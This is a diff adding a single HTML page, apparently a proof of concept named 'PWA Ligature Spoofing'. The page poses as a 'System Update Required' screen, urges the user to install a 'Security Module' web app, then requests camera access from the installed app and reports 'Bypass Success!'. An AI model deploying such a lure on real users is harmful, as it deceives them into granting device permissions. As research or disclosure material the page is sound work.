@@ -1,0 +1,99 @@
+<!doctype html>
+<html lang="en">
+  <head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>PWA Ligature Spoofing</title>
+    <link rel="manifest" href="manifest.json" />
+    <style>
+      body {
+        font-family: sans-serif;
+        text-align: center;
+        margin-top: 50px;
+        background: #f0f2f5;
+      }
+      .btn {
+        padding: 15px 30px;
+        font-size: 18px;
+        margin: 10px;
+        background: #1a73e8;
+        color: white;
+        border: none;
+        border-radius: 8px;
+        font-weight: bold;
+        cursor: pointer;
+      }
+      #installBtn {
+        display: none;
+        background: #34a853;
+      }
+      #status {
+        margin-top: 20px;
+        font-weight: bold;
+        color: #d93025;
+      }
+    </style>
+  </head>
+  <body>
+    <h1>System Update Required</h1>
+    <div id="status">Checking environment...</div>
+
+    <button id="installBtn" class="btn">1. Install Security Module</button>
+    <button id="triggerBtn" class="btn" style="display: none">
+      2. Verify System (Camera)
+    </button>
+
+    <script>
+      let deferredPrompt;
+      const installBtn = document.getElementById("installBtn");
+      const triggerBtn = document.getElementById("triggerBtn");
+      const statusDiv = document.getElementById("status");
+
+      // Cek apakah user sudah membuka web ini dari mode PWA (Standalone)
+      const isPWA =
+        window.matchMedia("(display-mode: standalone)").matches ||
+        new URLSearchParams(window.location.search).get("pwa") === "true";
+
+      if (isPWA) {
+        statusDiv.innerText =
+          "Running in Secure Module (PWA Mode). Ready to trigger.";
+        statusDiv.style.color = "#1e8e3e";
+        triggerBtn.style.display = "inline-block";
+      } else {
+        statusDiv.innerText = "Please install the module first to proceed.";
+
+        // Tangkap event PWA Install
+        window.addEventListener("beforeinstallprompt", (e) => {
+          e.preventDefault();
+          deferredPrompt = e;
+          installBtn.style.display = "inline-block";
+        });
+
+        installBtn.addEventListener("click", async () => {
+          if (deferredPrompt) {
+            deferredPrompt.prompt();
+            const { outcome } = await deferredPrompt.userChoice;
+            if (outcome === "accepted") {
+              statusDiv.innerText =
+                "Installing... Please open the app from your home screen.";
+            }
+            deferredPrompt = null;
+          }
+        });
+      }
+
+      // Trigger Permission dari dalam mode PWA
+      triggerBtn.addEventListener("click", () => {
+        navigator.mediaDevices
+          .getUserMedia({ video: true })
+          .then((stream) => {
+            stream.getTracks().forEach((track) => track.stop());
+            statusDiv.innerText = "Bypass Success! Permission granted.";
+          })
+          .catch((err) => {
+            statusDiv.innerText = "Permission Denied.";
+          });
+      });
+    </script>
+  </body>
+</html>
